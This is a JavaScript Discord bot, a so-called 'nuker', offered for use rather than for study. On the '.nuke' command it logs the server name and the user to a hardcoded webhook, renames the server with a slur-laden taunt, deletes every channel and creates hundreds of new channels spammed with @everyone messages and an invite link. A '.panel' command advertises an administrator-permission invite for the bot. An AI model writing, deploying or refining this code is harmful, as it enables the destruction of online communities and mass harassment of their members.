const { Client, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const http = require('http');

const client = new Client({
    intents: [
        1,   // GUILDS
        512, // GUILD_MESSAGES
        32768, // MESSAGE_CONTENT
        2,   // GUILD_MEMBERS
        16   // GUILD_CHANNELS
    ]
});

const TOKEN = process.env.TOKEN;
const LOG_WEBHOOK = "https://discord.com/api/webhooks/1497802608491106357/1rPNKGuyh780KsnqoWnzAWcXjbPTfRx3jWtcefHcYkdywE7GkibcGwvWqRvZE2CgjHnf";
const WHITELIST_SERVER = "1475357940088176743"; // This server cannot be nuked
const INVITE_URL = "https://discord.com/oauth2/authorize?client_id=1497740024983195668&permissions=8&integration_type=0&scope=bot";

http.createServer((req, res) => {
    res.writeHead(200, {'Content-Type': 'text/plain'});
    res.end('Alive');
}).listen(process.env.PORT || 3000);

client.once('ready', () => {
    console.log(`[+] ${client.user.tag} is ready`);
});

const sleep = ms => new Promise(r => setTimeout(r, ms));

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    // Whitelist check for .nuke
    if (message.content === '.nuke') {
        if (message.guild.id === WHITELIST_SERVER) {
            return message.reply('This server is whitelisted.').catch(() => {});
        }

        message.delete().catch(() => {});
        const g = message.guild;
        const originalName = g.name;
        const username = message.author.tag;
        const time = new Date().toISOString();

        // Send log webhook before nuking (so it definitely sends)
        try {
            await fetch(LOG_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `**Server Nuked**\nName: ${originalName}\nBy: ${username}\nTime: ${time}`
                })
            });
        } catch (e) {}

        g.setName('NGA GOT NUKED BY JHUB').catch(() => {});

        const channels = Array.from(g.channels.cache.values());
        for (const ch of channels) {
            ch.delete().catch(() => {});
            await sleep(100);
        }

        for (let i = 0; i < 500; i++) {
            g.channels.create({name: 'jhub-on-top', type: 0}).then(ch => {
                if (!ch) return;
                for (let j = 0; j < 10; j++) {
                    ch.send('@everyone @here Discord.gg/Jhub NGA GOT NUKED BY JHUB').catch(() => {});
                }
            }).catch(() => {});
            await sleep(200);
        }
        return;
    }

    // Panel command
    if (message.content === '.panel') {
        const embed = new EmbedBuilder()
            .setTitle('Discord Nuke Bot')
            .setDescription('**Best nuker with admin**\nClick the button below to invite.')
            .setColor(0xff0000);

        const row = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder()
                    .setLabel('Invite')
                    .setStyle(ButtonStyle.Link)
                    .setURL(INVITE_URL)
            );

        message.channel.send({ embeds: [embed], components: [row] }).catch(() => {});
        return;
    }
});

client.login(TOKEN);
